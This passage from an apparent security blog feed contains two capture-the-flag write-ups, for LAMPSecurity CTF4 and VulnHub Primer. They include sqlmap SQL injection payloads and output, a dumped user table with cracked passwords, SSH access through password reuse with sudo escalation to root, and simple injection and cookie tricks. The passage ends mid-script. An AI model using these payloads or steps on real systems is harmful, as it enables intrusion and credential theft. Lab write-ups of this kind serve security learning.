<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF4]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/"/>
    <updated>2016-04-19T05:40:39-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is part of a CTF series by the LAMPSecurity project.</p>

<!-- more -->


<p>The Nmap scan reveals just a few ports:</p>

<p>``` plain
root@pwnbox:~/Downloads#nmap -sS -sV -p1-65535 192.168.80.152</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-02 09:26 EST
Nmap scan report for 192.168.80.152
Host is up, received arp-response (0.00038s latency).
Not shown: 65531 filtered ports, 1 closed port
Reason: 65369 no-responses, 162 host-prohibiteds and 1 reset
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.3 (protocol 2.0)
25/tcp open  smtp    syn-ack ttl 64 Sendmail 8.13.5/8.13.5
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.0 ((Fedora))
MAC Address: 00:0C:29:1D:B6:45 (VMware)
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix
```</p>

<p>Checking out the web server, we can see this page:</p>

<p><img class="center" src="/images/pentest/ctf4/home.png" title="&lsquo;home&rsquo; &lsquo;home&rsquo;" ></p>

<p>Let&rsquo;s get digging!</p>

<h3>Recon</h3>

<p>The Blog section contains some blog posts, for which the URL looks like this: <code><a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5</a></code>. That id parameter calls for SQLi testing and the page parameter could be vulnerable to LFI. But for now, let&rsquo;s keep sniffing around.</p>

<p>One of the things I always do when doing web based challenges is check if there&rsquo;s anything of interest in the <code>robots.txt</code> file. So I did it here as well and I wasn&rsquo;t disappointed:</p>

<p><code>plain
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
</code></p>

<p>Quite a few places to check! Let&rsquo;s see what we&rsquo;ve got.</p>

<ul>
<li><strong>/mail/</strong></li>
</ul>


<p>This is not your regular mail server:</p>

<p><img class="center" src="/images/pentest/ctf4/squirrel.png" title="&lsquo;squirrelmail&rsquo; &lsquo;squirrelmail&rsquo;" ></p>

<p>I&rsquo;ve never seen this before, so I checked the project&rsquo;s homepage:</p>

<blockquote><p>SquirrelMail is a standards-based webmail package written in PHP. It includes built-in pure PHP support for the IMAP and SMTP protocols, and
all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is
very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support,
address books, and folder manipulation.</p></blockquote>

<p>Ok, will come back to this, for now I&rsquo;m just checking the entire thing for possible entry points.</p>

<ul>
<li><strong>/restricted/</strong></li>
</ul>


<p>Trying to get to this folder will pop up a basic authentication window. Moving on</p>

<ul>
<li><strong>/conf/</strong></li>
</ul>


<p>This one gives an internal server error, but discloses the e-mail address of the server administrator: <code>dstevens@localhost</code></p>

<ul>
<li><strong>/sql/</strong></li>
</ul>


<p>Here we have a directory indexing with a db.sql file that contains the following:</p>

<p><code>sql
use ehks;
create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
</code></p>

<ul>
<li><strong>/admin/</strong></li>
</ul>


<p>And finally, an admin login page.</p>

<p><img class="center" src="/images/pentest/ctf4/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin&rsquo;" ></p>

<p>Also, the search functionality is vulnerable to XSS! Ok, we have enough information to start poking deeper.</p>

<h3>Getting in</h3>

<p>First thing I tried was to put a quote in the id parameter, and a SQL error popped up:  <em>Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20</em>. Time to fire Sqlmap!</p>

<p>First, I enumerated the available databases:</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=2">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=2</a>&rdquo; -p &ldquo;id&rdquo; &mdash;dbms=MySQL &mdash;dbs</p>

<p>[06:05:45] [INFO] testing connection to the target URL</p>

<h2>sqlmap resumed the following injection point(s) from stored session:</h2>

<p>Parameter: id (GET)</p>

<pre><code>Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: page=blog&amp;title=Blog&amp;id=2 AND 4151=4151

Type: AND/OR time-based blind
Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
Payload: page=blog&amp;title=Blog&amp;id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))tueL)

Type: UNION query
Title: Generic UNION query (NULL) - 5 columns
Payload: page=blog&amp;title=Blog&amp;id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7671,0x61536d554d5745557253,0x7162716a71),NULL,NULL-- 
</code></pre>

<hr />

<p>[06:05:45] [INFO] testing MySQL
[06:05:45] [INFO] confirming MySQL
[06:05:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 (Bordeaux)
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL >= 5.0.0
[06:05:45] [INFO] fetching database names
available databases [6]:
[<em>] calendar
[</em>] ehks
[<em>] information_schema
[</em>] mysql
[<em>] roundcubemail
[</em>] test
```</p>

<p>I then looked at the ehks database, the interesting table contains usernames and password hashes:</p>

<p><code>plain
Database: ehks
Table: user
[6 entries]
+---------+-----------+----------------------------------+
| user_id | user_name | user_pass                        |
+---------+-----------+----------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
+---------+-----------+----------------------------------+
</code></p>

<p>I cracked the MD5 hashes with an online tool, behold the passwords!</p>

<p><code>plain
dstevens: ilike2surf
achen: seventysixers
pmoore: Homesite
jdurbin: Sue1978
sorzek: pacman
ghighland: undone1
</code></p>

<p>With dstevens' credentials I was able to log in both to the mail and admin panel. The admin functionality allows you to create another blog page, which I tested and it works. The mailbox was more interesting, because it was filled with OSSEC HIDS logs of my attacks! Will delete them before I&rsquo;m done, but for now I scrolled all the way to the bottom to find some real mail:</p>

<p>``` plain
I&rsquo;m installing OSSEC v2 on the server &ndash; so I also had to install gcc and
binutils.  Just wanted to let you know.</p>

<p>&mdash;
Andrew Chen
Unix Administrator
Ehks Data Research Center
```</p>

<p>I&rsquo;m thinking this mail is not just for occupying storage, but it&rsquo;s hinting that we&rsquo;ll have to do some binary exploitation on the target..Anyway, there is more mail about the server setup:</p>

<p>``` plain
Hello all,</p>

<p>  the server is up and running now and should be able to support most of
our needs.  Don and I are still working on installing a few more patches
and configuring things.  Let us know if you have any problems.  Thanks!</p>

<p>&mdash;
Don Stevens
Sr. Unix Admin
Prof. Ehks Data Research Center
```</p>

<p>``` plain</p>

<p>Hey Don,</p>

<p>  I think I got the server pretty much set up.  I just have to make some
more adjustments.  Unfortunately I couldn&rsquo;t get RoundCube installed
because our version of PHP is too low.  I&rsquo;ll send more updates as I make
them.</p>

<p>&mdash;
James Durbin
Webmaster
Prof. Ehks Data Research Center
```</p>

<p>There is also mail about a calendar feature that I wasn&rsquo;t aware of:</p>

<p>``` plain
Hello all,</p>

<p>  I&rsquo;d like to announce that the new calendaring software is online.  You
all have accounts that you can log in with, they have the same username
and password as your machine accounts.  Feel free to log into the new
system at <a href="http://192.168.0.6/calendar.">http://192.168.0.6/calendar.</a>  Let me know if you have any
problems.</p>

<p>&mdash;
Don Stevens
```</p>

<p>I&rsquo;ve almost forgotten to check the <em>/restricted</em> folder, so I next did that. It worked with the pair of <em>pmoore/Homesite</em>. Inside there are 2 text files:</p>

<p>``` plain
blog_instructions.txt</p>

<h1>Instructions for Posting to the Blog</h1>

<p>Just log into the admin section at <a href="http://192.168.0.6/admin.">http://192.168.0.6/admin.</a>
Use your regular machine credentials (username and password).
Once you&rsquo;re logged in click the &ldquo;Blog&rdquo; link.</p>

<p>webmail_instructions.txt</p>

<h1>Instructions for Webmail</h1>

<p>Browse to the URL <a href="http://192.168.0.6/mail">http://192.168.0.6/mail</a>
Log in with your regular machine credentials (username and password).
Use webmail ;)</p>

<p>Let Don or James know if you&rsquo;re having problems.
```</p>

<p>Just stuff we had figured on our own. I checked the PHP version, because of the mail hint, the headers mention it as being 5.1.2. Next I logged in for the calendar:</p>

<p><img class="center" src="/images/pentest/ctf4/calendar.png" title="&lsquo;calendar&rsquo; &lsquo;calendar&rsquo;" ></p>

<p>In the admin tab we can modify some calendar options and add a new user. Nothing too helpful in hacking the target, although I did try a RFI because a Nessus scan I&rsquo;ve run indicated the calendar was vulnerable to <a href="http://www.gulftech.org/advisories/PHP-Calendar%20Arbitrary%20File%20Inclusion/58">arbitrary file inclusion</a>. So the last thing left to try before thinking of more options was to see if I could login to SSH with any of the usernames and passwords I had. And I was able to get in the box from the first try, as dstevens!</p>

<p>I looked around in his home directory, the files related to the site are hosted there. Then I tried to read the <code>/etc/sudoers</code> file, and it worked with sudo and his password:</p>

<p>``` plain
&hellip;</p>

<h1>User privilege specification</h1>

<p>root    ALL=(ALL) ALL
dstevens    ALL=(ALL)   ALL
achen   ALL=(ALL)   NOPASSWD:ALL
&hellip;
```</p>

<p>Well, look at these privileges! Then it&rsquo;s all the matter of becoming root with a simple <em>su</em>:</p>

<p><code>plain
[dstevens@ctf4 calendar]$ sudo su -
Password:
[root@ctf4 ~]# whoami
root
</code></p>

<p>Game over! Although at the beginning there seemed to be multiple web avenues for exploitation, most of them were informational, and it was just the SQL injection that gave the keys to the kingdom. Lax permissions and password reuse facilitated the compromise of the target.</p>

<p>``` plain
/ Q: How do you shoot a blue elephant? A: \
| With a blue-elephant gun.               |
|                                         |
| Q: How do you shoot a pink elephant? A: |
| Twist its trunk until it turns blue,    |
| then shoot it with                      |
|                                         |
\ a blue-elephant gun.                    /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Primer]]></title>
    <link href="http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/"/>
    <updated>2016-03-11T06:56:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to try a VM named Primer that was recently added to VulnHub. I was hooked by the description of it being a story driven VM that was inspired by William Gibson&rsquo;s Spraw Trilogy, which was one of my first reads in hacking literature, after I became interested in the subject! And it also provided me with a new novel to read, since I didn&rsquo;t know about Snow Crash:</p>

<blockquote><p>Concept</p>

<p>This is a story based challenge written in a style heavily inspired by Neil Stephensons Snow Crash and William Gibsons Sprawl Trilogy. Each
chapter is unlocked by solving the puzzle. From hardcoded clear text javascript password checks, SQL-injections and cracking hashes to a
simulated terminal. You only need to start the VM, a webserver will come up and you can connect with your browser. In fact you never have to
leave the browser.</p>

<p>Goal</p>

<p>Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s
going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and
responsibility.</p></blockquote>

<!-- more -->


<p>After you determine the IP address of the VM, point your browser to it and you will be greeted by this:</p>

<p><img class="center" src="/images/pentest/primer/primer_level1.png" title="&lsquo;primer level 1&rsquo; &lsquo;primer level 1&rsquo;" ></p>

<p>Read the story, it&rsquo;s a nice way to get you immersed in the challenge, and it also contains hints for solving the level.</p>

<p>Looking in the source, I saw this:</p>

<p><code>plain
Some f0rms are easier than others.
This one was just a means to get to the next level so there was no need for her to apply her full set of skills or fake credentials. Manufacturing a bo0le4n response would probably be enaugh to let her pass.
</code></p>

<p>Well then, following the hint, I used a classic SQLi string that would be evaluated as True: <code>yo &lsquo;or 1=1&mdash; </code></p>

<p><img class="center" src="/images/pentest/primer/primer_level2.png" title="&lsquo;primer level 2&rsquo; &lsquo;primer level 2&rsquo;" ></p>

<p>The description points to the user agent, and when checking the source again, we can see a comment stating exactly what we need to fool the bot:</p>

<p><code>plain
This bot was looking for a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 hash of the first 7 digits of
pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security.
</code></p>

<p>Ok..I took the first 7 digits of Pi (3.141592) and converted them to MD5, getting the string <em>d483d00d07fcc80319d170ccf07fb5be</em>. Then I changed my user agent to this string, and bam!</p>

<p><img class="center" src="/images/pentest/primer/primer_level3.png" title="&lsquo;primer level 3&rsquo; &lsquo;primer level 3&rsquo;" ></p>

<p>This time there is no hint in the source, but reading the plot description made me think about cookies, and I discovered an activeSession cookie with a value of false. Now let&rsquo;s see what happens if I change it to true..</p>

<p>Reloaded the page..and!</p>

<p><img class="center" src="/images/pentest/primer/primer_level4.png" title="&lsquo;primer level 4&rsquo; &lsquo;primer level 4&rsquo;" ></p>

<p>I almost missed the hint hidden inside the <code><head></code> tag:</p>

<p><code>html
&lt;meta http-equiv="hint" content="Think, but don't act like a robot." /&gt;
</code>
This made me check if there is a robots.txt file, and there I found the next piece of the puzzle!</p>

<p><code>plain
User-agent: *
Disallow: /4_8f14e45fceea167a5a36dedd4bea2543
</code></p>

<p><img class="center" src="/images/pentest/primer/primer_level5.png" title="&lsquo;primer level 5&rsquo; &lsquo;primer level 5&rsquo;" ></p>

<p>Clicking the thing on this page that stands out will take you elsewhere.. :) you can see in the source exactly where:</p>

<p>``` html</p>

<h1><a href="../5_6512bd43d9caa6e02c990b0a82652dca">[EOF]</a></h1>


<p>```</p>

<p><img class="center" src="/images/pentest/primer/primer_level6.png" title="&lsquo;primer level 6&rsquo; &lsquo;primer level 6&rsquo;" ></p>

<p>So, the character in the story seems to be getting more and more familiar..:D Now, let&rsquo;s go to the place that smells like a trap, and see what awaits us there!</p>

<p><img class="center" src="/images/pentest/primer/primer_level7.png" title="&lsquo;primer level 7&rsquo; &lsquo;primer level 7&rsquo;" ></p>

<p>You can see the page keeps reloading and you can&rsquo;t right-click to view the source..but there are other ways! First, I entered something in the box to see what would happen:</p>

<p><img class="center" src="/images/pentest/primer/beware.png" title="&lsquo;beware&rsquo; &lsquo;beware&rsquo;" ></p>

<p>Yikes! Who knows what horrible thing we have disturbed! Better complete the rest fast! I looked at the source of the page with the <code>view-source</code> command:</p>

<p><code>plain
view-source:http://192.168.80.149/6_c51ce410c124a10e0db5e4b97fc2af39/
</code></p>

<p>There is a Javascript code that decides the redirection when entering something in the box. Let&rsquo;s look at it:</p>

<p><code>js
var X;
var L="Ikdf076";
X=prompt('/()=','');
if (X === null){window.location = "./_.php";}
if (X.substr(2,7) == L){}
else {window.location = "./_.php";}
</code></p>

<p>The only way not to get..noticed, is to enter something that would match <em>substr()</em> method. <a href="http://www.w3schools.com/jsref/jsref_substr.asp">This method</a> extracts parts of a string, beginning at the character at the specified position, and returns the specified number of characters. So the code is looking in our input for the string Ikdf076 starting at the third character. I entered 00Ikdf076 and penetrated deeper into the intranet!</p>

<p><img class="center" src="/images/pentest/primer/primer_level7b.png" title="&lsquo;primer level 7&rsquo; &lsquo;primer level 7&rsquo;" ></p>

<p>Moving further, looks like another reloading page.</p>

<p><img class="center" src="/images/pentest/primer/primer_level8.png" title="&lsquo;primer level 8&rsquo; &lsquo;primer level 8&rsquo;" ></p>

<p>Reading the source, there is another script that we have to decipher:</p>

<p>``` js</p>

<SCRIPT language="JavaScript">
var _0x5cf4=["","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x73\x70\x6C\x69\x74","\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65\x66","\x6A\x6F\x69\x6E","\x68\x65\x6C\x6C\x6F","\x35\x64\x34\x31\x34\x30\x32\x61\x62\x63\x34\x62\x32\x61\x37\x36\x62\x39\x37\x31\x39\x64\x39\x31\x31\x30\x31\x37\x63\x35\x39\x32","\x30\x64\x32\x38\x63\x62\x61\x30\x62\x64\x34\x66\x32\x36\x65\x31\x36\x64\x37\x36\x36\x30\x30\x30\x64\x32\x37\x65\x34\x39\x66\x61","\xA7\x23\x2F\x24","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x2E\x2F\x5F\x2E\x70\x68\x70","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x6C\x6F\x61\x64\x69\x6E\x67","\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x20\x20\x20\x20\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x20\x20\x3C\x68\x31\x3E\x5B\x2B\x2B\x51\x2B\x2B\x2B\x2B\x2B\x2B\x5D\x3C\x2F\x68\x31\x3E\x20\x20\x20\x20\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x6C\x6F\x6E\x67\x65\x72\x20\x73\x75\x72\x65\x20\x77\x68\x61\x74\x20\x68\x65\x72\x20\x6F\x72\x69\x67\x69\x6E\x61\x6C\x20\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x2E\x20\x42\x75\x74\x20\x69\x74\x20\x64\x69\x64\x6E\x27\x74\x20\x6D\x61\x74\x74\x65\x72\x20\x61\x6E\x79\x77\x61\x79\x2E\x20\x57\x68\x61\x74\x20\x73\x74\x69\x6C\x6C\x20\x6D\x61\x74\x74\x65\x72\x65\x64\x20\x77\x61\x73\x20\x67\x65\x74\x74\x69\x6E\x67\x20\x6F\x75\x74\x20\x6F\x66\x20\x68\x65\x72\x65\x2C\x20\x61\x6C\x69\x76\x65\x2E\x20\x20\x20\x20\x20\x20\x4C\x6F\x67\x20\x6F\x75\x74\x2C\x20\x74\x65\x6C\x6C\x20\x74\x68\x65\x20\x63\x6C\x69\x65\x6E\x74\x20\x74\x6F\x20\x67\x6F\x20\x66\x75\x63\x6B\x20\x68\x69\x6D\x73\x65\x6C\x66\x20\x61\x6E\x64\x20\x67\x65\x74\x20\x61\x20\x66\x69\x78\x20\x6F\x66\x20\x6E\x30\x69\x73\x65\x20\x74\x6F\x20\x73\x68\x75\x74\x20\x6F\x66\x66\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x52\x65\x6C\x61\x78\x20\x77\x69\x74\x68\x20\x61\x20\x6D\x69\x6E\x64\x6C\x65\x73\x73\x20\x68\x6F\x6C\x6F\x20\x66\x6C\x69\x63\x6B\x20\x61\x6E\x64\x20\x6E\x65\x76\x65\x72\x20\x6C\x6F\x6F\x6B\x20\x62\x61\x63\x6B\x20\x61\x74\x20\x74\x68\x69\x73\x20\x77\x65\x69\x72\x64\x20\x6A\x6F\x62\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x41\x20\x76\x69\x6F\x6C\x65\x6E\x74\x20\x6E\x65\x6F\x6E\x20\x66\x6C\x69\x63\x6B\x65\x72\x20\x61\x70\x70\x65\x61\x72\x65\x64\x20\x61\x74\x20\x74\x68\x65\x20\x68\x6F\x72\x69\x7A\x6F\x6E\x2E\x20\x4E\x6F\x20\x74\x68\x75\x6E\x64\x65\x72\x20\x66\x6F\x6C\x6C\x6F\x77\x65\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x73\x74\x61\x72\x65\x64\x20\x69\x6E\x20\x74\x68\x65\x20\x64\x69\x73\x74\x61\x6E\x63\x65\x20\x77\x69\x74\x68\x20\x61\x20\x62\x6C\x61\x6E\x6B\x20\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x22\x48\x65\x6C\x6C\x6F\x2C\x20\x4E\x69\x65\x76\x65\x2E\x22\x20\x41\x20\x64\x65\x65\x70\x2C\x20\x66\x65\x6D\x69\x6E\x69\x6E\x65\x2C\x20\x64\x69\x67\x69\x74\x61\x6C\x20\x76\x6F\x69\x63\x65\x20\x72\x6F\x61\x72\x65\x64\x20\x69\x6E\x20\x68\x65\x72\x20\x68\x65\x61\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x46\x55\x43\x4B\x21\x20\x54\x68\x69\x73\x20\x77\x61\x73\x20\x68\x65\x72\x20\x72\x65\x61\x6C\x20\x6E\x61\x6D\x65\x2E\x20\x53\x68\x65\x20\x68\x61\x64\x6E\x27\x74\x20\x75\x73\x65\x64\x20\x69\x74\x20\x69\x6E\x20\x79\x65\x61\x72\x73\x2E\x2E\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x22\x49\x20\x77\x69\x6C\x6C\x20\x6C\x6F\x67\x6F\x75\x74\x20\x61\x6E\x64\x20\x73\x74\x6F\x70\x20\x74\x68\x69\x73\x20\x73\x68\x69\x74\x20\x72\x69\x67\x68\x74\x20\x66\x75\x63\x6B\x69\x6E\x67\x20\x6E\x6F\x77\x21\x22\x20\x53\x68\x65\x20\x73\x63\x72\x65\x61\x6D\x65\x64\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x6E\x65\x6F\x6E\x20\x65\x78\x70\x61\x6E\x73\x65\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x4E\x6F\x74\x68\x69\x6E\x67\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x64\x69\x64\x6E\x27\x74\x2E\x20\x53\x6F\x6D\x65\x74\x68\x69\x6E\x67\x20\x62\x65\x73\x69\x64\x65\x20\x74\x68\x65\x20\x66\x65\x61\x72\x20\x6F\x63\x63\x75\x70\x69\x65\x64\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x49\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x20\x74\x68\x65\x72\x65\x20\x73\x69\x6E\x63\x65\x20\x74\x68\x65\x20\x73\x65\x63\x6F\x6E\x64\x20\x6E\x6F\x64\x65\x20\x61\x6E\x64\x20\x67\x72\x65\x77\x20\x73\x74\x72\x6F\x6E\x67\x65\x72\x20\x77\x69\x74\x68\x20\x65\x76\x65\x72\x79\x20\x6D\x6F\x76\x65\x2E\x20\x54\x68\x65\x72\x65\x20\x77\x61\x73\x20\x61\x20\x70\x61\x74\x74\x65\x72\x6E\x20\x69\x6E\x20\x74\x68\x65\x20\x70\x61\x74\x68\x20\x73\x68\x65\x20\x68\x61\x64\x20\x74\x61\x6B\x65\x6E\x20\x74\x68\x72\x6F\x75\x67\x68\x20\x74\x68\x65\x20\x6E\x65\x74\x77\x6F\x72\x6B\x2E\x20\x41\x6E\x20\x61\x72\x74\x69\x66\x69\x63\x69\x61\x6C\x20\x70\x61\x74\x74\x65\x72\x6E\x2C\x20\x6C\x61\x79\x65\x64\x20\x6F\x75\x74\x20\x62\x79\x20\x73\x6F\x6D\x65\x6F\x6E\x65\x20\x6F\x72\x20\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x54\x68\x65\x72\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x68\x69\x6E\x74\x2C\x20\x6E\x6F\x20\x6F\x62\x76\x69\x6F\x75\x73\x20\x73\x74\x65\x70\x2E\x20\x46\x69\x6E\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x6E\x65\x78\x74\x20\x6E\x6F\x64\x65\x20\x77\x6F\x75\x6C\x64\x20\x62\x65\x20\x74\x68\x65\x20\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65\x2C\x20\x6F\x72\x20\x6D\x61\x79\x62\x65\x20\x6D\x6F\x72\x65\x20\x6C\x69\x6B\x65\x20\x61\x20\x74\x65\x73\x74\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x66\x6F\x6F","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"];
  
  /*"Someone didn't bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and..." - The Plague*/
  
function md5cycle(_0xf6a0x2,_0xf6a0x3){var _0xf6a0x4=_0xf6a0x2[0],_0xf6a0x5=_0xf6a0x2[1],_0xf6a0x6=_0xf6a0x2[2],_0xf6a0x7=_0xf6a0x2[3];_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[0],7,-680876936);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[1],12,-389564586);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[2],17,606105819);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[3],22,-1044525330);_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[4],7,-176418897);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[5],12,1200080426);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[6],17,-1473231341);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[7],22,-45705983);_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[8],7,1770035416);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[9],12,-1958414417);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[10],17,-42063);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[11],22,-1990404162);_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[12],7,1804603682);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[13],12,-40341101);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[14],17,-1502002290);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[15],22,1236535329);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[1],5,-165796510);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[6],9,-1069501632);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[11],14,643717713);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[0],20,-373897302);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[5],5,-701558691);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[10],9,38016083);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[15],14,-660478335);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[4],20,-405537848);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[9],5,568446438);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[14],9,-1019803690);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[3],14,-187363961);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_